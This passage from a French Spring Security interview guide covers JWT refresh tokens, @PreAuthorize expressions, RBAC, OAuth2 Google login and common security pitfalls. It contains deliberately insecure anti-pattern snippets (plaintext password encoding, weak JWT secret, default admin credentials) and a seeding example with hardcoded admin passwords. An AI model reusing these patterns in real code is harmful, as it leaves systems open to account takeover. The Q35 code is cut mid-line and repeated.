```java
@Service
public class TokenBlacklistService {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token, long expiration) {
        redisTemplate.opsForValue().set(
            "blacklist:" + token,
            "true",
            expiration,
            TimeUnit.MILLISECONDS
        );
    }
    
    public boolean isBlacklisted(String token) {
        return Boolean.TRUE.equals(
            redisTemplate.hasKey("blacklist:" + token)
        );
    }
}
```

---

**Q32 : Comment implémenter Refresh Tokens avec JWT ?**

**R :** 

**Concept :**
- **Access Token** : Court (15min), utilisé pour les requêtes
- **Refresh Token** : Long (7 jours), utilisé uniquement pour obtenir un nouveau Access Token

**Flow :**
```
1. Login → Server génère Access Token (15min) + Refresh Token (7 jours)
2. Client utilise Access Token pour requêtes
3. Access Token expire → Client envoie Refresh Token à /auth/refresh
4. Server valide Refresh Token → Génère nouveau Access Token
5. Repeat...
```

**Implémentation :**
```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private RefreshTokenService refreshTokenService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        // Authentifier...
        
        // Générer Access Token (15min)
        String accessToken = jwtUtil.generateToken(username, roles, 900000L); // 15min
        
        // Générer Refresh Token (7 jours)
        RefreshToken refreshToken = refreshTokenService.createRefreshToken(username);
        
        return ResponseEntity.ok(new AuthResponse(
            accessToken,
            refreshToken.getToken(),
            username,
            roles
        ));
    }
    
    @PostMapping("/refresh")
    public ResponseEntity<?> refreshToken(@RequestBody RefreshTokenRequest request) {
        String requestRefreshToken = request.getRefreshToken();
        
        return refreshTokenService.findByToken(requestRefreshToken)
            .map(refreshTokenService::verifyExpiration)
            .map(RefreshToken::getUser)
            .map(user -> {
                String newAccessToken = jwtUtil.generateToken(
                    user.getUsername(),
                    user.getRoles(),
                    900000L
                );
                return ResponseEntity.ok(new RefreshTokenResponse(newAccessToken));
            })
            .orElseThrow(() -> new TokenRefreshException("Refresh token not found or expired"));
    }
    
    @PostMapping("/logout")
    public ResponseEntity<?> logout(@RequestBody LogoutRequest request) {
        refreshTokenService.deleteByToken(request.getRefreshToken());
        return ResponseEntity.ok(new MessageResponse("Logout successful"));
    }
}

// Refresh Token Entity
@Entity
@Data
public class RefreshToken {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @ManyToOne
    @JoinColumn(name = "user_id")
    private User user;
    
    @Column(unique = true, nullable = false)
    private String token;
    
    @Column(nullable = false)
    private Instant expiryDate;
}

// Refresh Token Service
@Service
public class RefreshTokenService {
    
    @Value("${jwt.refreshExpiration}")
    private Long refreshTokenDuration; // 604800000 = 7 jours
    
    @Autowired
    private RefreshTokenRepository refreshTokenRepository;
    
    @Autowired
    private UserRepository userRepository;
    
    public RefreshToken createRefreshToken(String username) {
        User user = userRepository.findByUsername(username).orElseThrow();
        
        RefreshToken refreshToken = new RefreshToken();
        refreshToken.setUser(user);
        refreshToken.setToken(UUID.randomUUID().toString());
        refreshToken.setExpiryDate(Instant.now().plusMillis(refreshTokenDuration));
        
        return refreshTokenRepository.save(refreshToken);
    }
    
    public Optional<RefreshToken> findByToken(String token) {
        return refreshTokenRepository.findByToken(token);
    }
    
    public RefreshToken verifyExpiration(RefreshToken token) {
        if (token.getExpiryDate().compareTo(Instant.now()) < 0) {
            refreshTokenRepository.delete(token);
            throw new TokenRefreshException("Refresh token expired");
        }
        return token;
    }
    
    public void deleteByToken(String token) {
        refreshTokenRepository.findByToken(token)
            .ifPresent(refreshTokenRepository::delete);
    }
}
```

**Côté client :**
```javascript
let accessToken = 'eyJhbGc...'; // Access token (15min)
let refreshToken = 'uuid-refresh-token'; // Refresh token (7 jours)

async function makeRequest(url) {
    let response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${accessToken}` }
    });
    
    // Si token expiré
    if (response.status === 401) {
        // Refresh l'access token
        const refreshResponse = await fetch('/auth/refresh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken })
        });
        
        if (refreshResponse.ok) {
            const data = await refreshResponse.json();
            accessToken = data.accessToken; // Nouveau access token
            
            // Retry la requête originale
            response = await fetch(url, {
                headers: { 'Authorization': `Bearer ${accessToken}` }
            });
        } else {
            // Refresh token aussi expiré → Redirect to login
            window.location.href = '/login';
        }
    }
    
    return response;
}
```

---

### **Questions sur Method-Level Security**

**Q33 : Quelle est la différence entre @EnableWebSecurity et @EnableMethodSecurity ?**

**R :** 

**@EnableWebSecurity :**
- Active Spring Security au niveau **global**
- Configure la **SecurityFilterChain**
- Protège les **URLs** (request matchers)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated()
        );
        return http.build();
    }
}
```

**@EnableMethodSecurity (Spring Boot 3+) :**
- Active la sécurité au niveau **méthode**
- Permet d'utiliser `@PreAuthorize`, `@PostAuthorize`, `@Secured`, `@RolesAllowed`
- Protection **fine-grained** sur les méthodes individuelles

```java
@Configuration
@EnableMethodSecurity(
    prePostEnabled = true,    // @PreAuthorize, @PostAuthorize
    securedEnabled = true,    // @Secured
    jsr250Enabled = true      // @RolesAllowed
)
public class SecurityConfig { }
```

**Les deux sont complémentaires :**
- `@EnableWebSecurity` → Protection au niveau HTTP
- `@EnableMethodSecurity` → Protection au niveau business logic

---

**Q34 : Quand utiliser @PreAuthorize vs @Secured vs @RolesAllowed ?**

**R :** 

**@PreAuthorize (recommandé) :**
- ✅ Support des **expressions SpEL** (très puissant)
- ✅ Logique complexe possible
- ✅ Standard Spring

```java
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long id) { }

@PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
public void updateUser(Long id, User user) { }

@PreAuthorize("@userSecurity.canAccessUser(#id)")
public User getUser(Long id) { }

@PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR')")
public void moderateContent() { }
```

**@Secured :**
- ❌ Pas de SpEL
- ✅ Simple et direct
- ⚠️ Nécessite préfixe `ROLE_`

```java
@Secured("ROLE_ADMIN") // ROLE_ obligatoire
public void deleteUser(Long id) { }

@Secured({"ROLE_ADMIN", "ROLE_MODERATOR"}) // OR logic
public void moderateContent() { }
```

**@RolesAllowed (Java EE standard) :**
- ❌ Pas de SpEL
- ✅ Portabilité Java EE
- ✅ Pas de préfixe `ROLE_`

```java
@RolesAllowed("ADMIN") // Pas de ROLE_
public void deleteUser(Long id) { }

@RolesAllowed({"ADMIN", "MODERATOR"})
public void moderateContent() { }
```

**Ma recommandation : @PreAuthorize** pour sa flexibilité maximale.

---

**Q35 : Donnez des exemples d'expressions SpEL complexes avec @PreAuthorize**

**R :** 

```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    // 1. Vérifier un rôle spécifique
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(@PathVariable Long id) { }
    
    // 2. Multiple roles (OR)
    @GetMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR', 'USER')")
    public List<User> getUsers() { }
    
    // 3. Multiple roles (AND)
    @PostMapping("/privileged")
    @PreAuthorize("hasRole('ADMIN') and hasRole('SUPER_USER')")
    public void privilegedAction() { }
    
    // 4. User peut accéder ses propres données OU être admin
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public User updateUser(@PathVariable Long id, @RequestBody User user) { }
    
    // 5. Vérifier une permission spécifique
    @DeleteMapping("/{id}/posts/{postId}")
    @PreAuthorize("hasAuthority('DELETE_POST')")
    public void deletePost(@PathVariable Long id, @PathVariable Long postId) { }
    
    // 6. Custom security expression (Bean method)
    @GetMapping("/{id}")
    @PreAuthorize("@userSecurity.canAccessUser(#id)")
    public User getUser(@PathVariable Long


```java
    @GetMapping("/{id}")
    @PreAuthorize("@userSecurity.canAccessUser(#id)")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
    
    // 7. Vérifier le propriétaire d'une ressource
    @PutMapping("/posts/{postId}")
    @PreAuthorize("@postSecurity.isOwner(#postId, authentication.principal.username)")
    public Post updatePost(@PathVariable Long postId, @RequestBody Post post) {
        return postService.update(postId, post);
    }
    
    // 8. Combinaison complexe
    @PostMapping("/sensitive-action")
    @PreAuthorize("hasRole('ADMIN') and hasIpAddress('192.168.1.0/24')")
    public void sensitiveAction() { }
    
    // 9. Vérifier si user est authentifié
    @GetMapping("/profile")
    @PreAuthorize("isAuthenticated()")
    public User getProfile() { }
    
    // 10. Anonymous only (ex: page login)
    @GetMapping("/public/welcome")
    @PreAuthorize("isAnonymous()")
    public String welcome() { }
    
    // 11. Vérifier propriété d'un objet dans le body
    @PutMapping("/accounts/{id}")
    @PreAuthorize("#account.owner == authentication.principal.username")
    public Account updateAccount(@PathVariable Long id, @RequestBody Account account) {
        return accountService.update(account);
    }
}

// Custom Security Beans
@Component("userSecurity")
public class UserSecurity {
    
    public boolean canAccessUser(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        // Admin peut accéder à tout
        if (auth.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"))) {
            return true;
        }
        
        // User peut accéder à ses propres données
        String currentUsername = auth.getName();
        User currentUser = userService.findByUsername(currentUsername);
        
        return currentUser.getId().equals(userId);
    }
}

@Component("postSecurity")
public class PostSecurity {
    
    @Autowired
    private PostRepository postRepository;
    
    public boolean isOwner(Long postId, String username) {
        return postRepository.findById(postId)
            .map(post -> post.getAuthor().getUsername().equals(username))
            .orElse(false);
    }
    
    public boolean canEdit(Long postId, String username) {
        // Admin ou owner peut éditer
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        boolean isAdmin = auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
        
        return isAdmin || isOwner(postId, username);
    }
}
```

**Expressions SpEL disponibles :**
- `hasRole('ROLE')` : Vérifie un rôle
- `hasAnyRole('ROLE1', 'ROLE2')` : OR sur plusieurs rôles
- `hasAuthority('PERMISSION')` : Vérifie une permission
- `hasAnyAuthority('PERM1', 'PERM2')` : OR sur permissions
- `isAuthenticated()` : User authentifié
- `isAnonymous()` : User non-authentifié
- `principal` : L'objet principal (UserDetails)
- `authentication` : L'objet Authentication complet
- `#paramName` : Accès aux paramètres de méthode
- `@beanName.method()` : Appeler une méthode d'un bean Spring

---

**Q36 : Quelle est la différence entre @PreAuthorize et @PostAuthorize ?**

**R :** 

**@PreAuthorize :**
- Évaluation **AVANT** l'exécution de la méthode
- Si condition false → Exception lancée, méthode non exécutée
- Usage typique : Vérifier permissions avant action

```java
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long id) {
    // Cette méthode ne s'exécute QUE si user a role ADMIN
    userRepository.deleteById(id);
}
```

**@PostAuthorize :**
- Évaluation **APRÈS** l'exécution de la méthode
- Peut accéder au **returnObject** (résultat de la méthode)
- Si condition false → Exception, résultat non retourné
- Usage typique : Filtrer données selon ownership

```java
@PostAuthorize("returnObject.owner == authentication.principal.username")
public Document getDocument(Long id) {
    // Méthode s'exécute toujours
    Document doc = documentRepository.findById(id).orElseThrow();
    
    // Après exécution, vérifie si user est owner
    // Si non → AccessDeniedException
    return doc;
}

// Exemple pratique
@PostAuthorize("returnObject.author.username == authentication.principal.username or hasRole('ADMIN')")
public Post getPost(Long postId) {
    return postRepository.findById(postId).orElseThrow();
}
```

**Comparaison :**
```java
// PRE: Vérifie AVANT (efficient, évite DB call si unauthorized)
@PreAuthorize("hasRole('ADMIN')")
public User getUserAdmin(Long id) {
    return userRepository.findById(id); // Ne s'exécute que si ADMIN
}

// POST: Vérifie APRÈS (nécessaire si condition dépend du résultat)
@PostAuthorize("returnObject.isPublic or returnObject.owner == authentication.name")
public Article getArticle(Long id) {
    return articleRepository.findById(id); // S'exécute toujours
    // Puis vérifie si article public OU user est owner
}
```

**Règle :** Utiliser `@PreAuthorize` autant que possible (plus efficient). Utiliser `@PostAuthorize` uniquement si la condition dépend du résultat.

---

**Q37 : Comment implémenter un système de permissions granulaires (RBAC) ?**

**R :** 

**RBAC (Role-Based Access Control)** avec permissions granulaires :

**Modèle de données :**
```java
@Entity
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String username;
    private String password;
    
    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
        name = "user_roles",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set<Role> roles = new HashSet<>();
}

@Entity
@Data
public class Role {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String name; // ADMIN, USER, MODERATOR
    
    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
        name = "role_permissions",
        joinColumns = @JoinColumn(name = "role_id"),
        inverseJoinColumns = @JoinColumn(name = "permission_id")
    )
    private Set<Permission> permissions = new HashSet<>();
}

@Entity
@Data
public class Permission {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String name; // USER_READ, USER_WRITE, USER_DELETE, POST_CREATE, etc.
}
```

**UserDetailsService custom :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsernameWithRolesAndPermissions(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));
        
        // Collecter toutes les permissions depuis tous les rôles
        Set<GrantedAuthority> authorities = new HashSet<>();
        
        // Ajouter les rôles
        for (Role role : user.getRoles()) {
            authorities.add(new SimpleGrantedAuthority("ROLE_" + role.getName()));
            
            // Ajouter les permissions du rôle
            for (Permission permission : role.getPermissions()) {
                authorities.add(new SimpleGrantedAuthority(permission.getName()));
            }
        }
        
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getPassword(),
            authorities
        );
    }
}
```

**Utilisation avec @PreAuthorize :**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    // Vérifier permission spécifique
    @GetMapping
    @PreAuthorize("hasAuthority('USER_READ')")
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    @PostMapping
    @PreAuthorize("hasAuthority('USER_CREATE')")
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
    
    @PutMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_UPDATE')")
    public User updateUser(@PathVariable Long id, @RequestBody User user) {
        return userService.update(id, user);
    }
    
    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_DELETE')")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
    
    // Combinaison de permissions
    @PostMapping("/{id}/promote")
    @PreAuthorize("hasAuthority('USER_UPDATE') and hasAuthority('ROLE_MANAGE')")
    public User promoteUser(@PathVariable Long id) {
        return userService.promoteToAdmin(id);
    }
    
    // Permission OU rôle
    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_READ') or hasRole('ADMIN')")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
}
```

**Initialisation des rôles et permissions (DataLoader) :**
```java
@Component
public class DataLoader implements ApplicationRunner {
    
    @Autowired
    private RoleRepository roleRepository;
    
    @Autowired
    private PermissionRepository permissionRepository;
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    @Override
    public void run(ApplicationArguments args) {
        if (roleRepository.count() == 0) {
            // Créer permissions
            Permission userRead = permissionRepository.save(new Permission("USER_READ"));
            Permission userCreate = permissionRepository.save(new Permission("USER_CREATE"));
            Permission userUpdate = permissionRepository.save(new Permission("USER_UPDATE"));
            Permission userDelete = permissionRepository.save(new Permission("USER_DELETE"));
            
            Permission postRead = permissionRepository.save(new Permission("POST_READ"));
            Permission postCreate = permissionRepository.save(new Permission("POST_CREATE"));
            Permission postUpdate = permissionRepository.save(new Permission("POST_UPDATE"));
            Permission postDelete = permissionRepository.save(new Permission("POST_DELETE"));
            
            // Créer rôle USER (permissions limitées)
            Role userRole = new Role();
            userRole.setName("USER");
            userRole.setPermissions(Set.of(userRead, postRead, postCreate));
            roleRepository.save(userRole);
            
            // Créer rôle MODERATOR
            Role moderatorRole = new Role();
            moderatorRole.setName("MODERATOR");
            moderatorRole.setPermissions(Set.of(
                userRead, postRead, postCreate, postUpdate, postDelete
            ));
            roleRepository.save(moderatorRole);
            
            // Créer rôle ADMIN (toutes les permissions)
            Role adminRole = new Role();
            adminRole.setName("ADMIN");
            adminRole.setPermissions(Set.of(
                userRead, userCreate, userUpdate, userDelete,
                postRead, postCreate, postUpdate, postDelete
            ));
            roleRepository.save(adminRole);
            
            // Créer admin user
            User admin = new User();
            admin.setUsername("admin");
            admin.setPassword(passwordEncoder.encode("admin123"));
            admin.setRoles(Set.of(adminRole));
            userRepository.save(admin);
            
            // Créer user normal
            User normalUser = new User();
            normalUser.setUsername("john");
            normalUser.setPassword(passwordEncoder.encode("password123"));
            normalUser.setRoles(Set.of(userRole));
            userRepository.save(normalUser);
        }
    }
}
```

**Avantages RBAC avec permissions :**
- ✅ Contrôle très fin (permission par action)
- ✅ Flexibilité (changer permissions sans toucher au code)
- ✅ Évolutif (ajouter nouvelles permissions facilement)
- ✅ Audit trail possible

---

### **Questions sur OAuth2**

**Q38 : Qu'est-ce que OAuth2 et à quoi sert-il ?**

**R :** 

**OAuth2** est un **protocole d'autorisation** (pas d'authentification) qui permet à une application d'accéder aux ressources d'un utilisateur sur un autre service sans exposer ses credentials.

**Use cases principaux :**
1. **"Login with Google/Facebook/GitHub"** (Social Login)
2. **Délégation d'accès** : Permettre à une app tierce d'accéder à vos données (ex: app mobile accède à votre Google Drive)

**Exemple concret :**
```
Vous voulez utiliser une app de gestion de photos qui accède à votre Google Photos
→ OAuth2 permet à l'app d'accéder à vos photos SANS connaître votre mot de passe Google
```

**Roles dans OAuth2 :**
- **Resource Owner** : L'utilisateur (vous)
- **Client** : L'application (l'app de gestion photos)
- **Authorization Server** : Serveur qui authentifie l'utilisateur (Google)
- **Resource Server** : Serveur qui héberge les ressources protégées (Google Photos API)

---

**Q39 : Expliquez le flow OAuth2 Authorization Code**

**R :** 

**Authorization Code Flow** est le flow le plus sécurisé pour les applications web.

**Étapes détaillées :**

```
1. User clique "Login with Google" sur myapp.com

2. myapp.com → Redirect vers Google Authorization Server
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=YOUR_CLIENT_ID
     &redirect_uri=https://myapp.com/callback
     &response_type=code
     &scope=profile email

3. User → Login sur Google + Accepte les permissions (scope)

4. Google → Redirect vers myapp.com/callback?code=AUTHORIZATION_CODE

5. myapp.com (backend) → Exchange code for tokens
   POST https://oauth2.googleapis.com/token
   Body:
     code=AUTHORIZATION_CODE
     client_id=YOUR_CLIENT_ID
     client_secret=YOUR_CLIENT_SECRET
     redirect_uri=https://myapp.com/callback
     grant_type=authorization_code

6. Google → Response avec tokens
   {
     "access_token": "ya29.a0AfH6...",
     "expires_in": 3600,
     "token_type": "Bearer",
     "scope": "profile email",
     "refresh_token": "1//0gH..." (optionnel)
   }

7. myapp.com → Use access_token pour récupérer user info
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Header: Authorization: Bearer ya29.a0AfH6...

8. Google → Response user info
   {
     "id": "123456789",
     "email": "john@gmail.com",
     "name": "John Doe",
     "picture": "https://..."
   }

9. myapp.com → Create local session/JWT for user
```

**Pourquoi Authorization Code au lieu de direct Access Token ?**
- ✅ **Client Secret** jamais exposé au browser
- ✅ **Authorization Code** échangé côté serveur (sécurisé)
- ✅ Protection contre interception

---

**Q40 : Comment implémenter "Login with Google" dans Spring Boot ?**

**R :** 

**1. Créer OAuth2 Client sur Google Cloud Console :**
```
1. https://console.cloud.google.com/
2. Create Project → "MyApp"
3. APIs & Services → Credentials
4. Create OAuth 2.0 Client ID
   - Application type: Web application
   - Authorized redirect URIs: http://localhost:8080/login/oauth2/code/google
5. Copy Client ID et Client Secret
```

**2. Dépendances :**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

**3. application.properties :**
```properties
# Google OAuth2
spring.security.oauth2.client.registration.google.client-id=YOUR_CLIENT_ID.apps.googleusercontent.com
spring.security.oauth2.client.registration.google.client-secret=YOUR_CLIENT_SECRET
spring.security.oauth2.client.registration.google.scope=profile,email
spring.security.oauth2.client.registration.google.redirect-uri={baseUrl}/login/oauth2/code/{registrationId}

# GitHub OAuth2 (optionnel)
spring.security.oauth2.client.registration.github.client-id=YOUR_GITHUB_CLIENT_ID
spring.security.oauth2.client.registration.github.client-secret=YOUR_GITHUB_SECRET
spring.security.oauth2.client.registration.github.scope=read:user,user:email
```

**4. Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error", "/webjars/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard", true)
                .failureUrl("/login?error=true")
                .userInfoEndpoint(userInfo -> userInfo
                    .userService(customOAuth2UserService)
                )
            )
            .logout(logout -> logout
                .logoutSuccessUrl("/")
                .permitAll()
            );
        
        return http.build();
    }
}
```

**5. Custom OAuth2UserService (sauvegarder user en DB) :**
```java
@Service
public class CustomOAuth2UserService extends DefaultOAuth2UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        OAuth2User oAuth2User = super.loadUser(userRequest);
        
        String provider = userRequest.getClientRegistration().getRegistrationId(); // google, github
        String providerId = oAuth2User.getAttribute("sub"); // Google ID
        String email = oAuth2User.getAttribute("email");
        String name = oAuth2User.getAttribute("name");
        String picture = oAuth2User.getAttribute("picture");
        
        // Chercher ou créer user
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> {
                User newUser = new User();
                newUser.setEmail(email);
                newUser.setName(name);
                newUser.setProvider(provider);
                newUser.setProviderId(providerId);
                newUser.setPicture(picture);
                newUser.setRoles(Set.of("USER"));
                return userRepository.save(newUser);
            });
        
        // Update info si nécessaire
        if (!user.getName().equals(name) || !user.getPicture().equals(picture)) {
            user.setName(name);
            user.setPicture(picture);
            userRepository.save(user);
        }
        
        return oAuth2User;
    }
}
```

**6. Entity User (OAuth2) :**
```java
@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String email;
    private String name;
    private String picture;
    
    // OAuth2 fields
    private String provider; // google, github, facebook
    private String providerId; // ID from provider
    
    @ElementCollection(fetch = FetchType.EAGER)
    private Set<String> roles = new HashSet<>();
    
    // Pas de password pour OAuth2 users
}
```

**7. Controllers :**
```java
@Controller
public class HomeController {
    
    @GetMapping("/")
    public String home() {
        return "home";
    }
    
    @GetMapping("/login")
    public String login() {
        return "login";
    }
    
    @GetMapping("/dashboard")
    public String dashboard(Model model, @AuthenticationPrincipal OAuth2User principal) {
        if (principal != null) {
            model.addAttribute("name", principal.getAttribute("name"));
            model.addAttribute("email", principal.getAttribute("email"));
            model.addAttribute("picture", principal.getAttribute("picture"));
        }
        return "dashboard";
    }
}
```

**8. Login Page (Thymeleaf) :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login to MyApp</h1>
    
    <div>
        <a href="/oauth2/authorization/google">
            <button>
                <img src="/images/google-icon.png" alt="Google">
                Login with Google
            </button>
        </a>
    </div>
    
    <div>
        <a href="/oauth2/authorization/github">
            <button>
                <img src="/images/github-icon.png" alt="GitHub">
                Login with GitHub
            </button>
        </a>
    </div>
    
    <div th:if="${param.error}">
        <p style="color: red;">Login failed. Please try again.</p>
    </div>
</body>
</html>
```

**9. Dashboard Page :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Dashboard</title>
</head>
<body>
    <h1>Welcome, <span th:text="${name}">User</span>!</h1>
    
    <div>
        <img th:src="${picture}" alt="Profile Picture" width="100">
        <p>Email: <span th:text="${email}">email@example.com</span></p>
    </div>
    
    <a href="/logout">
        <button>Logout</button>
    </a>
</body>
</html>
```

---

**Q41 : Comment combiner OAuth2 et JWT dans une même application ?**

**R :** 

**Use case :** Login with Google (OAuth2) puis utiliser JWT pour les requêtes API.

**Flow :**
```
1. User → Login with Google (OAuth2)
2. App → Récupère user info depuis Google
3. App → Crée/update user en DB
4. App → Génère JWT avec user info
5. App → Retourne JWT au client
6. Client → Utilise JWT pour toutes les requêtes API
```

**Implémentation :**

```java
@RestController
@RequestMapping("/auth")
public class OAuth2AuthController {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserRepository userRepository;
    
    @GetMapping("/oauth2/success")
    public ResponseEntity<?> oauth2Success(@AuthenticationPrincipal OAuth2User principal) {
        
        // Extraire info depuis OAuth2
        String email = principal.getAttribute("email");
        String name = principal.getAttribute("name");
        
        // Charger ou créer user
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> {
                User newUser = new User();
                newUser.setEmail(email);
                newUser.setName(name);
                newUser.setProvider("google");
                newUser.setRoles(Set.of("USER"));
                return userRepository.save(newUser);
            });
        
        // Générer JWT
        List<String> roles = new ArrayList<>(user.getRoles());
        String jwtToken = jwtUtil.generateToken(user.getEmail(), roles);
        
        // Retourner JWT
        return ResponseEntity.ok(new AuthResponse(
            jwtToken,
            user.getEmail(),
            user.getName(),
            roles
        ));
    }
}

// Security Config
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable())
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/auth/**", "/oauth2/**", "/login/**").permitAll()
            .anyRequest().authenticated()
        )
        .oauth2Login(oauth2 -> oauth2
            .defaultSuccessUrl("/auth/oauth2/success", true)
        )
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
    
    return http.build();
}
```

**Frontend (React) :**
```javascript
// Ouvrir popup OAuth2
function loginWithGoogle() {
    const width = 500;
    const height = 600;
    const left = window.screen.width / 2 - width / 2;
    const top = window.screen.height / 2 - height / 2;
    
    const popup = window.open(
        'http://localhost:8080/oauth2/authorization/google',
        'Google Login',
        `width=${width},height=${height},left=${left},top=${top}`
    );
    
    // Écouter message depuis popup
    window.addEventListener('message', (event) => {
        if (event.origin === 'http://localhost:8080') {
            const { token } = event.data;
            localStorage.setItem('token', token);
            popup.close();
            window.location.href = '/dashboard';
        }
    });
}
```

---

**Q42 : Quels sont les problèmes de sécurité courants avec Spring Security et comment les éviter ?**

**R :** 

**1. Weak Password Encoding :**
```java
// ❌ MAUVAIS
@Bean
public PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance(); // Plain text !
}

// ✅ BON
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);
}
```

**2. CSRF Disabled sans raison :**
```java
// ❌ MAUVAIS (pour app web avec session)
http.csrf(csrf -> csrf.disable());

// ✅ BON (désactiver uniquement pour REST API stateless)
http
    .csrf(csrf -> csrf.disable())
    .sessionManagement(session -> session
        .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
    );
```

**3. Permissive CORS :**
```java
// ❌ MAUVAIS
configuration.setAllowedOrigins(Arrays.asList("*"));
configuration.setAllowCredentials(true); // Ne fonctionne pas avec *

// ✅ BON
configuration.setAllowedOrigins(Arrays.asList(
    "http://localhost:3000",
    "https://myapp.com"
));
configuration.setAllowCredentials(true);
```

**4. JWT Secret faible :**
```properties
# ❌ MAUVAIS
jwt.secret=secret

# ✅ BON (256+ bits)
jwt.secret=myVerySecureSecretKeyForJwtTokenGenerationWithAtLeast256BitsForHS256Algorithm
```

**5. JWT sans expiration :**
```java
// ❌ MAUVAIS
return Jwts.builder()
    .setSubject(username)
    // Pas d'expiration !
    .signWith(key)
    .compact();

// ✅ BON
return Jwts.builder()
    .setSubject(username)
    .setExpiration(new Date(System.currentTimeMillis() + 900000)) // 15min
    .signWith(key)
    .compact();
```

**6. Exposer stack traces en production :**
```java
// ❌ MAUVAIS
@ExceptionHandler(Exception.class)
public ResponseEntity<?> handleException(Exception e) {
    return ResponseEntity.status(500).body(e.getMessage());
}

// ✅ BON
@ExceptionHandler(Exception.class)
public ResponseEntity<?> handleException(Exception e) {
    logger.error("Error occurred", e);
    return ResponseEntity.status(500)
        .body(new ErrorResponse("Internal server error"));
}
```

**7. No HTTPS en production :**
```properties
# ✅ Force HTTPS
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=password
server.ssl.key-store-type=PKCS12
```

**8. Default credentials :**
```java
// ❌ MAUVAIS
UserDetails user = User.builder()
    .username("admin")
    .password("admin")
    .build();

// ✅ BON
UserDetails user = User.builder()
    .username(env.getProperty("ADMIN_USERNAME"))
    .password(passwordEncoder.encode(env.getProperty("ADMIN_PASSWORD")))
    .build();
```